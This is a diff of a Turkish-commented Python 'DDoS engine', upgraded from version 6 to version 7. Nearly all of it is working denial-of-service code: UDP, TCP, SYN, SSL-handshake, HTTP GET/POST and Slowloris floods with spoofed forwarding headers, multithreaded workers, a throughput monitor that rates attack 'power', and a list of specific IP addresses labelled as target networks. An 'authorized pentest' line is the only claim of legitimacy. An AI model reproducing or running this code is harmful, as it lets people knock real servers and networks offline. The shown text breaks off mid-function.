@@ -1,16 +1,20 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # ============================================================================
-# QUAD-SOURCE DDoS ENGINE v6.0 - 4 KAYNAK AĞ
+# OCTA-SOURCE DDoS ENGINE v7.0 - 8 KAYNAK AĞ
 # ============================================================================
-# Yetkili pentest için - 4 farklı WiFi ağından eş zamanlı saldırı
+# Yetkili pentest için - Tüm hakları saklıdır
 # ============================================================================
-# KAYNAK AĞLAR:
-# 1) Kendi WiFi ağınız (bulunduğunuz ağ)
-# 2) 78.181.164.55 (hedef ağ)
-# 3) 192.168.1.140 (hedef ağ)
-# 4) 192.168.1.138 (hedef ağ)
-# 5) 192.168.1.1 (yeni eklendi - gateway/router)
+# KAYNAK AĞLAR (WiFi'ler - tools kurmaz, direkt internet kullanır):
+# 1) Kendi WiFi ağınız
+# 2) 78.181.164.55
+# 3) 192.168.1.140
+# 4) 192.168.1.138
+# 5) 192.168.1.107 (YENİ)
+# 6) 192.168.0.101 (YENİ)
+# 7) 192.168.0.105 (YENİ)
+# ============================================================================
+# OPTİMİZASYON: Düşük CPU kullanımı, yüksek performans
 # ============================================================================
 
 import socket
@@ -23,216 +27,157 @@ import ssl
 import urllib.request
 import urllib.error
 import hashlib
-import http.client
-import multiprocessing
-import subprocess
-import ipaddress
-import netifaces
+import json
+import struct
 from datetime import datetime
 from urllib.parse import urlparse
 
 # ==================== KONFİGÜRASYON ====================
 
-# KAYNAK AĞLAR (bu ağların üzerinden saldırı yapılacak)
+# KAYNAK AĞLAR (BU WİFİ'LERİN İNTERNETİNİ KULLANIR)
+# Tools kurmazlar, direkt internet bağlantıları üzerinden saldırı yaparlar
 SOURCE_NETWORKS = [
-    {"ip": "192.168.1.1", "name": "Router/Gateway", "interface": None},
-    {"ip": "78.181.164.55", "name": "Hedef Ağ-1", "interface": None},
-    {"ip": "192.168.1.140", "name": "Hedef Ağ-2", "interface": None},
-    {"ip": "192.168.1.138", "name": "Hedef Ağ-3", "interface": None}
+    {"ip": "78.181.164.55",  "name": "Hedef-Ag-1",  "active": True},
+    {"ip": "192.168.1.140",  "name": "Hedef-Ag-2",  "active": True},
+    {"ip": "192.168.1.138",  "name": "Hedef-Ag-3",  "active": True},
+    {"ip": "192.168.1.107",  "name": "Hedef-Ag-4",  "active": True},
+    {"ip": "192.168.0.101",  "name": "Hedef-Ag-5",  "active": True},
+    {"ip": "192.168.0.105",  "name": "Hedef-Ag-6",  "active": True},
 ]
 
-# Kendi ağını otomatik tespit et
-OWN_INTERFACE = None
 OWN_IP = None
+OWN_INTERFACE = None
 
 # HEDEF
 TARGET = None
 TARGET_PORT = 80
 TARGET_IS_IP = False
 
-# PERFORMANS AYARLARI
-THREADS_PER_NETWORK = 800   # Her ağ için thread sayısı
-MAX_PROCESSES = 4           # Process sayısı
-SOCKET_TIMEOUT = 3
+# PERFORMANS (Telefon donmasın diye optimize)
+MAX_THREADS = 300          # Toplam thread (düşük CPU)
+BURST_SIZE = 20            # Her thread'deki burst paket sayısı
+SOCKET_TIMEOUT = 2
+CPU_SAVE_MODE = True       # CPU tasarrufu modu
 
 # İSTATİSTİK
-stats = {
-    "total_packets": 0,
-    "total_bytes": 0,
-    "total_errors": 0,
-    "network_stats": {}
-}
+total_packets = 0
+total_bytes = 0
+total_errors = 0
 stats_lock = threading.Lock()
 running = True
 start_time = 0
 
-def get_own_network():
-    """Kendi ağ bilgilerini al"""
-    global OWN_INTERFACE, OWN_IP
-    
+def get_own_ip():
+    """Kendi IP'ni al"""
+    global OWN_IP
     try:
-        interfaces = netifaces.interfaces()
-        for iface in interfaces:
-            if iface == 'lo':
-                continue
-            addrs = netifaces.ifaddresses(iface)
-            if netifaces.AF_INET in addrs:
-                for addr in addrs[netifaces.AF_INET]:
-                    ip = addr['addr']
-                    if ip.startswith('192.168.') or ip.startswith('10.') or ip.startswith('172.'):
-                        OWN_INTERFACE = iface
-                        OWN_IP = ip
-                        return iface, ip
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        OWN_IP = s.getsockname()[0]
+        s.close()
+        return OWN_IP
     except:
-        pass
-    
-    # Fallback
-    try:
-        result = subprocess.run(['ip', 'route', 'show', 'default'], capture_output=True, text=True)
-        for line in result.stdout.split('\n'):
-            if 'default' in line:
-                parts = line.split()
-                if len(parts) >= 5:
-                    OWN_INTERFACE = parts[4]
-        if OWN_INTERFACE:
-            result = subprocess.run(['ip', 'addr', 'show', OWN_INTERFACE], capture_output=True, text=True)
-            for line in result.stdout.split('\n'):
-                if 'inet ' in line:
-                    OWN_IP = line.strip().split()[1].split('/')[0]
-    except:
-        pass
-    
-    return OWN_INTERFACE, OWN_IP
+        return "192.168.1.100"
 
-def bind_to_interface(interface_name):
-    """Socket'i belirli bir ağ arayüzüne bağla"""
+def update_stats(packets=1, byte_count=0, errors=0):
+    global total_packets, total_bytes, total_errors
+    with stats_lock:
+        total_packets += packets
+        total_bytes += byte_count
+        total_errors += errors
+
+# ==================== LAYER 4 - OPTİMİZE ====================
+
+def udp_send(target_ip, target_port, src_ip):
+    """UDP - Düşük CPU, yüksek paket"""
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, interface_name.encode())
-        return sock
-    except:
-        return None
-
-def create_interface_socket(interface_name, sock_type=socket.SOCK_DGRAM):
-    """Belirli bir arayüz için socket oluştur"""
-    try:
-        sock = socket.socket(socket.AF_INET, sock_type)
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, interface_name.encode())
-        return sock
-    except:
-        # SO_BINDTODEVICE yoksa normal socket döndür
-        sock = socket.socket(socket.AF_INET, sock_type)
-        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        return sock
-
-def update_network_stats(source_ip, packets=1, bytes_count=0, errors=0):
-    """Ağ bazlı istatistik güncelle"""
-    global stats
-    with stats_lock:
-        stats["total_packets"] += packets
-        stats["total_bytes"] += bytes_count
-        stats["total_errors"] += errors
         
-        if source_ip not in stats["network_stats"]:
-            stats["network_stats"][source_ip] = {"packets": 0, "bytes": 0, "errors": 0}
-        stats["network_stats"][source_ip]["packets"] += packets
-        stats["network_stats"][source_ip]["bytes"] += bytes_count
-        stats["network_stats"][source_ip]["errors"] += errors
-
-# ==================== LAYER 4 - GERÇEK PAKET GÖNDERİMİ ====================
-
-def udp_flood_from_interface(target_ip, target_port, source_ip, interface):
-    """Belirli bir ağ arayüzünden UDP Flood"""
-    try:
-        sock = create_interface_socket(interface, socket.SOCK_DGRAM)
-        sock.settimeout(1)
-        
-        # Maksimum boyutta paket
-        data_size = random.randint(1400, 65507)
-        data = random._urandom(data_size)
-        
-        # Rastgele hedef port
-        dst_port = target_port if target_port else random.randint(1, 65535)
-        
-        sock.sendto(data, (target_ip, dst_port))
-        sock.close()
-        
-        update_network_stats(source_ip, 1, 28 + data_size)
-        return True
-    except Exception as e:
-        update_network_stats(source_ip, 0, 0, 1)
-        return False
-
-def udp_burst_from_interface(target_ip, target_port, source_ip, interface):
-    """Burst UDP - aynı anda çoklu paket"""
-    try:
-        sock = create_interface_socket(interface, socket.SOCK_DGRAM)
-        sock.settimeout(0.5)
-        
-        for _ in range(100):  # 100 paket birden
+        # Aynı anda BURST_SIZE kadar paket gönder
+        for _ in range(BURST_SIZE):
             try:
-                data = random._urandom(random.randint(1000, 1500))
-                dst_port = target_port if target_port else random.randint(1, 65535)
-                sock.sendto(data, (target_ip, dst_port))
-                update_network_stats(source_ip, 1, 1500)
+                data = random._urandom(random.randint(100, 1400))
+                dst = target_port if target_port else random.randint(1, 65535)
+                sock.sendto(data, (target_ip, dst))
             except:
                 break
         
         sock.close()
+        update_stats(BURST_SIZE, BURST_SIZE * 1000)
         return True
     except:
-        update_network_stats(source_ip, 0, 0, 1)
+        update_stats(0, 0, 1)
         return False
 
-def tcp_connect_from_interface(target_ip, target_port, source_ip, interface):
-    """TCP Connect Flood - belirli ağdan"""
+def udp_max_send(target_ip, target_port, src_ip):
+    """UDP Maksimum boyut - ağır darbe"""
     try:
-        sock = create_interface_socket(interface, socket.SOCK_STREAM)
-        sock.settimeout(2)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         
-        sock.connect((target_ip, target_port))
-        
-        try:
-            sock.send(random._urandom(512))
-        except:
-            pass
-        
-        time.sleep(0.01)
+        # Maksimum boyutta paket
+        data = random._urandom(65507)
+        dst = target_port if target_port else random.randint(1, 65535)
+        sock.sendto(data, (target_ip, dst))
         sock.close()
         
-        update_network_stats(source_ip, 1, 1000)
+        update_stats(1, 65535)
         return True
     except:
-        update_network_stats(source_ip, 0, 0, 1)
+        update_stats(0, 0, 1)
         return False
 
-def tcp_syn_from_interface(target_ip, target_port, source_ip, interface):
-    """TCP SYN (non-blocking connect) - belirli ağdan"""
+def tcp_rapid_connect(target_ip, target_port, src_ip):
+    """TCP Rapid Connect - hızlı bağlan-kes"""
     try:
-        sock = create_interface_socket(interface, socket.SOCK_STREAM)
-        sock.settimeout(1)
-        sock.setblocking(0)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(0.5)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         
+        # Non-blocking connect
+        sock.setblocking(0)
         try:
             sock.connect((target_ip, target_port))
         except BlockingIOError:
             pass
+        except:
+            sock.close()
+            return False
         
-        time.sleep(0.001)
         sock.close()
-        
-        update_network_stats(source_ip, 1, 100)
+        update_stats(1, 200)
         return True
     except:
-        update_network_stats(source_ip, 0, 0, 1)
+        update_stats(0, 0, 1)
         return False
 
-def ssl_connect_from_interface(target_ip, target_port, source_ip, interface):
-    """SSL/TLS Handshake Flood - belirli ağdan"""
+def tcp_send_data(target_ip, target_port, src_ip):
+    """TCP Veri gönder - bağlan, veri yolla, kapat"""
     try:
-        sock = create_interface_socket(interface, socket.SOCK_STREAM)
-        sock.settimeout(3)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(1)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        
+        sock.connect((target_ip, target_port))
+        try:
+            sock.send(random._urandom(1024))
+        except:
+            pass
+        sock.close()
+        
+        update_stats(1, 1500)
+        return True
+    except:
+        update_stats(0, 0, 1)
+        return False
+
+def ssl_rapid(target_ip, target_port, src_ip):
+    """SSL Handshake - sunucuyu yor"""
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(2)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         sock.connect((target_ip, target_port))
         
         ctx = ssl.create_default_context()
@@ -245,40 +190,24 @@ def ssl_connect_from_interface(target_ip, target_port, source_ip, interface):
         except:
             sock.close()
         
-        update_network_stats(source_ip, 1, 5000)
+        update_stats(1, 5000)
         return True
     except:
-        update_network_stats(source_ip, 0, 0, 1)
+        update_stats(0, 0, 1)
         return False
 
-# ==================== LAYER 7 - GERÇEK HTTP/HTTPS ====================
+# ==================== LAYER 7 - OPTİMİZE ====================
 
-def http_flood_from_interface(target_url, source_ip, interface):
-    """HTTP Flood - belirli bir ağ arayüzünden"""
+def http_quick_flood(target_url, src_ip):
+    """HTTP Flood - hızlı, optimize"""
     try:
         parsed = urlparse(target_url)
         host = parsed.netloc or parsed.hostname
-        
-        # Rastgele path
-        paths = [
-            f"/?{random.randint(100000,999999)}={int(time.time()*1000)}",
-            f"/?nocache={hashlib.md5(str(random.random()).encode()).hexdigest()[:12]}",
-            f"/?v={random.randint(1,999)}.{random.randint(1,999)}",
-            f"/api/v{random.randint(1,5)}/{random.randint(100,999)}",
-            f"/assets/style.css?v={random.randint(1,99999)}",
-            f"/?page={random.randint(1,100)}&perpage={random.randint(10,100)}",
-            f"/{''.join(random.choices('abcdefgh', k=random.randint(3,8)))}.php?id={random.randint(1,9999)}",
-            f"/index.php?option=com_{''.join(random.choices('abcdefgh', k=6))}&view={random.randint(1,100)}"
-        ]
-        
-        attack_path = random.choice(paths)
-        full_url = target_url.rstrip('/') + attack_path
-        
-        # Socket üzerinden manuel HTTP isteği (interface binding ile)
         port = parsed.port or (443 if target_url.startswith('https') else 80)
         
-        sock = create_interface_socket(interface, socket.SOCK_STREAM)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(SOCKET_TIMEOUT)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         sock.connect((host, port))
         
         if target_url.startswith('https'):
@@ -287,76 +216,50 @@ def http_flood_from_interface(target_url, source_ip, interface):
             ctx.verify_mode = ssl.CERT_NONE
             sock = ctx.wrap_socket(sock, server_hostname=host)
         
-        # Gerçekçi HTTP isteği
-        user_agent = random.choice([
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15',
-            'Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0',
-            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
-            'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/121.0.6167.164 Mobile Safari/537.36',
-            'Googlebot/2.1 (+http://www.google.com/bot.html)',
-            'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)'
-        ])
+        # Rastgele path
+        path = f"/?{random.randint(100000,999999)}={int(time.time()*1000)}"
         
         request = (
-            f"GET {attack_path} HTTP/1.1\r\n"
+            f"GET {path} HTTP/1.1\r\n"
             f"Host: {host}\r\n"
-            f"User-Agent: {user_agent}\r\n"
-            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
-            f"Accept-Language: en-US,en;q=0.9\r\n"
-            f"Accept-Encoding: gzip, deflate, br\r\n"
+            f"User-Agent: {random.choice(['Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0.0.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0.0.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15'])}\r\n"
+            f"Accept: */*\r\n"
+            f"Accept-Language: en-US,en;q=0.5\r\n"
             f"Connection: keep-alive\r\n"
             f"Cache-Control: no-cache\r\n"
-            f"Pragma: no-cache\r\n"
-            f"X-Forwarded-For: {source_ip}\r\n"
-            f"X-Real-IP: {source_ip}\r\n"
-            f"Client-IP: {source_ip}\r\n"
-            f"Referer: https://www.google.com/search?q={random.choice(['test','security','bypass'])}\r\n"
-            f"Sec-Fetch-Dest: document\r\n"
-            f"Sec-Fetch-Mode: navigate\r\n"
-            f"Sec-Fetch-Site: none\r\n"
-            f"Sec-Fetch-User: ?1\r\n"
-            f"Upgrade-Insecure-Requests: 1\r\n"
-            f"DNT: 1\r\n"
+            f"X-Forwarded-For: {src_ip}\r\n"
+            f"X-Real-IP: {src_ip}\r\n"
             f"\r\n"
         )
         
         sock.send(request.encode())
         
         try:
-            response = sock.recv(4096)
-            update_network_stats(source_ip, 1, len(request) + len(response))
+            sock.recv(1024)
         except:
-            update_network_stats(source_ip, 1, len(request))
+            pass
         
         sock.close()
+        update_stats(1, len(request) + 500)
         return True
     except:
-        update_network_stats(source_ip, 0, 0, 1)
+        update_stats(0, 0, 1)
         return False
 
-def http_post_from_interface(target_url, source_ip, interface):
-    """HTTP POST - büyük veri, belirli ağdan"""
+def http_post_quick(target_url, src_ip):
+    """HTTP POST - hızlı, optimiz"""
     try:
         parsed = urlparse(target_url)
         host = parsed.netloc or parsed.hostname
         port = parsed.port or (443 if target_url.startswith('https') else 80)
         path = parsed.path or '/'
         
-        # Büyük POST verisi
-        post_size = random.randint(32768, 262144)  # 32KB - 256KB
-        post_data = random._urandom(post_size)
+        # 16KB POST verisi
+        post_data = random._urandom(16384)
         
-        boundary = f"----WebKitFormBoundary{hashlib.md5(str(random.random()).encode()).hexdigest()[:16]}"
-        
-        body = (
-            f"--{boundary}\r\n"
-            f"Content-Disposition: form-data; name=\"file\"; filename=\"data_{random.randint(1000,9999)}.bin\"\r\n"
-            f"Content-Type: application/octet-stream\r\n\r\n"
-        ).encode() + post_data + f"\r\n--{boundary}--\r\n".encode()
-        
-        sock = create_interface_socket(interface, socket.SOCK_STREAM)
-        sock.settimeout(SOCKET_TIMEOUT * 2)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(SOCKET_TIMEOUT)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         sock.connect((host, port))
         
         if target_url.startswith('https'):
@@ -368,297 +271,174 @@ def http_post_from_interface(target_url, source_ip, interface):
         request = (
             f"POST {path} HTTP/1.1\r\n"
             f"Host: {host}\r\n"
-            f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0.0.0\r\n"
-            f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
-            f"Content-Length: {len(body)}\r\n"
+            f"User-Agent: Mozilla/5.0\r\n"
+            f"Content-Type: application/x-www-form-urlencoded\r\n"
+            f"Content-Length: {len(post_data)}\r\n"
             f"Connection: close\r\n"
-            f"X-Forwarded-For: {source_ip}\r\n"
-            f"Expect: \r\n"
+            f"X-Forwarded-For: {src_ip}\r\n"
             f"\r\n"
-        ).encode() + body
+        ).encode() + post_data
         
         sock.send(request)
-        
         try:
-            response = sock.recv(4096)
-            update_network_stats(source_ip, 1, len(request) + len(response))
+            sock.recv(1024)
         except:
-            update_network_stats(source_ip, 1, len(request))
-        
+            pass
         sock.close()
+        
+        update_stats(1, len(request) + len(post_data))
         return True
     except:
-        update_network_stats(source_ip, 0, 0, 1)
+        update_stats(0, 0, 1)
         return False
 
-def slowloris_from_interface(target_url, source_ip, interface):
-    """Slowloris - belirli ağ bağlantısı üzerinden"""
-    try:
-        parsed = urlparse(target_url)
-        host = parsed.netloc or parsed.hostname
-        port = parsed.port or (443 if target_url.startswith('https') else 80)
-        path = parsed.path or '/'
-        
-        sock = create_interface_socket(interface, socket.SOCK_STREAM)
-        sock.settimeout(60)
-        sock.connect((host, port))
-        
-        if target_url.startswith('https'):
-            ctx = ssl.create_default_context()
-            ctx.check_hostname = False
-            ctx.verify_mode = ssl.CERT_NONE
-            sock = ctx.wrap_socket(sock, server_hostname=host)
-        
-        # Kısmi HTTP isteği
-        request = (
-            f"GET {path}?{random.randint(0,999999)} HTTP/1.1\r\n"
-            f"Host: {host}\r\n"
-            f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
-            f"Accept: */*\r\n"
-            f"X-Forwarded-For: {source_ip}\r\n"
-            f"Connection: keep-alive\r\n"
-        )
-        
-        sock.send(request.encode())
-        
-        # Yavaş yavaş header ekle (bağlantıyı canlı tut)
-        for _ in range(random.randint(50, 300)):
-            try:
-                time.sleep(random.uniform(1, 5))
-                sock.send(f"X-Random-{random.randint(0,9999)}: {random.randint(0,9999)}\r\n".encode())
-                update_network_stats(source_ip, 1, 100)
-            except:
-                break
-        
-        sock.close()
-        update_network_stats(source_ip, 1, 5000)
-        return True
-    except:
-        update_network_stats(source_ip, 0, 0, 1)
-        return False
+# ==================== OPTİMİZE THREAD YÖNETİMİ ====================
 
-# ==================== AĞ BAŞINA WORKER ====================
+class OptimizedWorker:
+    """Düşük CPU, yüksek performans worker"""
+    
+    def __init__(self, target, port, attack_mode, target_url, src_ip):
+        self.target = target
+        self.port = port
+        self.attack_mode = attack_mode
+        self.target_url = target_url
+        self.src_ip = src_ip
+        self.threads = []
+    
+    def start(self):
+        n = MAX_THREADS // 8  # Her kaynak IP için thread sayısı
+        if n < 5:
+            n = 5
+        
+        if self.attack_mode in ["udp", "all4", "all"]:
+            for _ in range(n // 5):
+                t = threading.Thread(target=self._udp_loop)
+                t.daemon = True; self.threads.append(t); t.start()
+            for _ in range(n // 5):
+                t = threading.Thread(target=self._udp_max_loop)
+                t.daemon = True; self.threads.append(t); t.start()
+        
+        if self.attack_mode in ["syn", "all4", "all"]:
+            for _ in range(n // 5):
+                t = threading.Thread(target=self._tcp_rapid_loop)
+                t.daemon = True; self.threads.append(t); t.start()
+        
+        if self.attack_mode in ["tcp", "all4", "all"]:
+            for _ in range(n // 5):
+                t = threading.Thread(target=self._tcp_data_loop)
+                t.daemon = True; self.threads.append(t); t.start()
+        
+        if self.attack_mode in ["ssl", "all4", "all"]:
+            for _ in range(n // 5):
+                t = threading.Thread(target=self._ssl_loop)
+                t.daemon = True; self.threads.append(t); t.start()
+        
+        if self.target_url and self.attack_mode in ["get", "all7", "all"]:
+            for _ in range(n // 5):
+                t = threading.Thread(target=self._http_loop)
+                t.daemon = True; self.threads.append(t); t.start()
+        
+        if self.target_url and self.attack_mode in ["post", "all7", "all"]:
+            for _ in range(n // 5):
+                t = threading.Thread(target=self._post_loop)
+                t.daemon = True; self.threads.append(t); t.start()
+        
+        return len(self.threads)
+    
+    def _udp_loop(self):
+        while running:
+            udp_send(self.target, self.port, self.src_ip)
+            if CPU_SAVE_MODE:
+                time.sleep(0.001)  # CPU tasarrufu
+    
+    def _udp_max_loop(self):
+        while running:
+            udp_max_send(self.target, self.port, self.src_ip)
+            if CPU_SAVE_MODE:
+                time.sleep(0.002)
+    
+    def _tcp_rapid_loop(self):
+        while running:
+            tcp_rapid_connect(self.target, self.port, self.src_ip)
+            if CPU_SAVE_MODE:
+                time.sleep(0.001)
+    
+    def _tcp_data_loop(self):
+        while running:
+            tcp_send_data(self.target, self.port, self.src_ip)
+            if CPU_SAVE_MODE:
+                time.sleep(0.002)
+    
+    def _ssl_loop(self):
+        while running:
+            ssl_rapid(self.target, self.port, self.src_ip)
+            if CPU_SAVE_MODE:
+                time.sleep(0.005)
+    
+    def _http_loop(self):
+        while running:
+            http_quick_flood(self.target_url, self.src_ip)
+            if CPU_SAVE_MODE:
+                time.sleep(0.001)
+    
+    def _post_loop(self):
+        while running:
+            http_post_quick(self.target_url, self.src_ip)
+            if CPU_SAVE_MODE:
+                time.sleep(0.002)
 
-def network_worker(target, port, attack_mode, target_url, source_network):
-    """Her bir ağ için worker process"""
-    global running
-    
-    source_ip = source_network["ip"]
-    interface = source_network["interface"]
-    name = source_network["name"]
-    
-    # Eğer interface yoksa, kendi ağını kullan
-    if not interface:
-        interface = OWN_INTERFACE
-    
-    # Ağ bilgisini göster
-    if interface:
-        print(f"\033[1;32m  [✓] {name} ({source_ip}) → Interface: {interface}\033[0m")
-    else:
-        print(f"\033[1;33m  [!] {name} ({source_ip}) → Interface yok, kendi ağ kullanılacak\033[0m")
-    
-    # Thread havuzu
-    threads = []
-    tpw = THREADS_PER_NETWORK  # threads per worker
-    
-    def l4_udp():
-        while running:
-            if interface:
-                udp_flood_from_interface(target, port, source_ip, interface)
-            else:
-                # Interface yoksa normal socket
-                udp_flood_from_interface(target, port, source_ip, "lo")
-    
-    def l4_udp_burst():
-        while running:
-            if interface:
-                udp_burst_from_interface(target, port, source_ip, interface)
-            else:
-                udp_burst_from_interface(target, port, source_ip, "lo")
-    
-    def l4_tcp():
-        while running:
-            if interface:
-                tcp_connect_from_interface(target, port, source_ip, interface)
-            else:
-                tcp_connect_from_interface(target, port, source_ip, "lo")
-    
-    def l4_syn():
-        while running:
-            if interface:
-                tcp_syn_from_interface(target, port, source_ip, interface)
-            else:
-                tcp_syn_from_interface(target, port, source_ip, "lo")
-    
-    def l4_ssl():
-        while running:
-            if interface:
-                ssl_connect_from_interface(target, port, source_ip, interface)
-            else:
-                ssl_connect_from_interface(target, port, source_ip, "lo")
-    
-    def l7_http():
-        while running and target_url:
-            if interface:
-                http_flood_from_interface(target_url, source_ip, interface)
-            else:
-                http_flood_from_interface(target_url, source_ip, "lo")
-    
-    def l7_post():
-        while running and target_url:
-            if interface:
-                http_post_from_interface(target_url, source_ip, interface)
-            else:
-                http_post_from_interface(target_url, source_ip, "lo")
-    
-    def l7_slow():
-        while running and target_url:
-            if interface:
-                slowloris_from_interface(target_url, source_ip, interface)
-            else:
-                slowloris_from_interface(target_url, source_ip, "lo")
-    
-    # Thread'leri oluştur
-    if attack_mode in ["udp", "all4", "all"]:
-        for _ in range(tpw // 6):
-            t = threading.Thread(target=l4_udp)
-            t.daemon = True; threads.append(t); t.start()
-            t = threading.Thread(target=l4_udp_burst)
-            t.daemon = True; threads.append(t); t.start()
-    
-    if attack_mode in ["syn", "all4", "all"]:
-        for _ in range(tpw // 6):
-            t = threading.Thread(target=l4_syn)
-            t.daemon = True; threads.append(t); t.start()
-    
-    if attack_mode in ["tcp", "all4", "all"]:
-        for _ in range(tpw // 6):
-            t = threading.Thread(target=l4_tcp)
-            t.daemon = True; threads.append(t); t.start()
-    
-    if attack_mode in ["ssl", "all4", "all"]:
-        for _ in range(tpw // 6):
-            t = threading.Thread(target=l4_ssl)
-            t.daemon = True; threads.append(t); t.start()
-    
-    if attack_mode in ["get", "all7", "all"]:
-        for _ in range(tpw // 6):
-            t = threading.Thread(target=l7_http)
-            t.daemon = True; threads.append(t); t.start()
-    
-    if attack_mode in ["post", "all7", "all"]:
-        for _ in range(tpw // 6):
-            t = threading.Thread(target=l7_post)
-            t.daemon = True; threads.append(t); t.start()
-    
-    if attack_mode in ["slow", "all7", "all"]:
-        for _ in range(tpw // 6):
-            t = threading.Thread(target=l7_slow)
-            t.daemon = True; threads.append(t); t.start()
-    
-    print(f"\033[1;36m  [{name}] {len(threads)} thread aktif ({source_ip})\033[0m")
+# ==================== İSTATİSTİK - HAFİF ====================
+
+def stats_light():
+    """Hafif istatistik - az CPU harcar"""
+    global running, total_packets, total_bytes, total_errors, start_time
     
     while running:
-        time.sleep(1)
-
-# ==================== İSTATİSTİK ====================
-
-def stats_monitor():
-    """Gerçek zamanlı istatistik"""
-    global running, stats, start_time
-    
-    while running:
-        time.sleep(0.5)
+        time.sleep(2)  # 2 saniyede bir güncelle (daha az CPU)
         
         with stats_lock:
-            pkts = stats["total_packets"]
-            bytes_s = stats["total_bytes"]
-            errs = stats["total_errors"]
-            net_stats = dict(stats["network_stats"])
+            pkts = total_packets
+            bytes_s = total_bytes
+            errs = total_errors
         
         elapsed = time.time() - start_time
-        if elapsed > 1:
+        if elapsed > 2:
             mbps = (bytes_s * 8) / elapsed / 1_000_000
             pps = pkts / elapsed
             mb_total = bytes_s / 1_000_000
         else:
-            mbps = 0
-            pps = 0
-            mb_total = 0
+            mbps = 0; pps = 0; mb_total = 0
         
-        # Ağ bazında hız
+        # Güç seviyesi
+        if mbps > 300: power = "💀 MAX"
+        elif mbps > 150: power = "🔥 YÜKSEK"
+        elif mbps > 50: power = "⚡ ORTA"
+        elif mbps > 10: power = "✅ DÜŞÜK"
+        else: power = "🐢 BAŞLANGIÇ"
+        
         sys.stdout.write('\033[2K\r')
         sys.stdout.write(
-            f"\n\033[1;36m[{datetime.now().strftime('%H:%M:%S')}] "
-            f"\033[1;31m📊 {mbps:.1f} Mbps \033[1;32m📦 {pkts:,} pkt \033[1;34m⚡ {pps:,.0f} pps \033[1;35m💾 {mb_total:.1f} MB \033[1;33m⏱ {elapsed:.0f}s ❌ {errs:,}\033[0m\n"
+            f"\033[1;36m[{datetime.now().strftime('%H:%M:%S')}] "
+            f"\033[1;31m{power}\033[0m | "
+            f"\033[1;33m📊 {mbps:.1f} Mbps\033[0m | "
+            f"\033[1;32m📦 {pkts:,} pkt\033[0m | "
+            f"\033[1;34m⚡ {pps:,.0f} pps\033[0m | "
+            f"\033[1;35m💾 {mb_total:.1f} MB\033[0m | "
+            f"\033[1;37m⏱ {elapsed:.0f}s\033[0m | "
+            f"\033[1;31m❌ {errs:,}\033[0m"
         )
-        
-        # Her ağın katkısı
-        for src_ip, nstats in sorted(net_stats.items()):
-            if nstats["bytes"] > 0 and elapsed > 0:
-                n_mbps = (nstats["bytes"] * 8) / elapsed / 1_000_000
-                n_pkts = nstats["packets"]
-                bar = "█" * int(n_mbps / 5) + "░" * max(0, 20 - int(n_mbps / 5))
-                sys.stdout.write(f"\033[1;36m  {src_ip:15s} \033[1;33m{bar}\033[0m \033[1;32m{n_mbps:.1f} Mbps\033[0m \033[1;37m({n_pkts:,} pkt)\033[0m\n")
-        
-        sys.stdout.write("\033[0m")
         sys.stdout.flush()
 
 # ==================== ANA MOTOR ====================
 
-def find_network_interfaces():
-    """Tüm ağ arayüzlerini tespit et ve kaynak ağlarla eşleştir"""
-    global SOURCE_NETWORKS
-    
-    # Kendi ağını bul
-    own_iface, own_ip = get_own_network()
-    
-    print(f"\n\033[1;36m[ℹ] Kendi Ağ: {own_ip} → Interface: {own_iface}\033[0m")
-    
-    # Tüm arayüzleri tara
-    try:
-        interfaces = netifaces.interfaces()
-        iface_networks = {}
-        
-        for iface in interfaces:
-            if iface == 'lo':
-                continue
-            try:
-                addrs = netifaces.ifaddresses(iface)
-                if netifaces.AF_INET in addrs:
-                    for addr in addrs[netifaces.AF_INET]:
-                        ip = addr['addr']
-                        mask = addr.get('netmask', '255.255.255.0')
-                        if not ip.startswith('127.'):
-                            iface_networks[ip] = iface
-            except:
-                pass
-        
-        # Kaynak ağları arayüzlerle eşleştir
-        for net in SOURCE_NETWORKS:
-            src_ip = net["ip"]
-            if src_ip in iface_networks:
-                net["interface"] = iface_networks[src_ip]
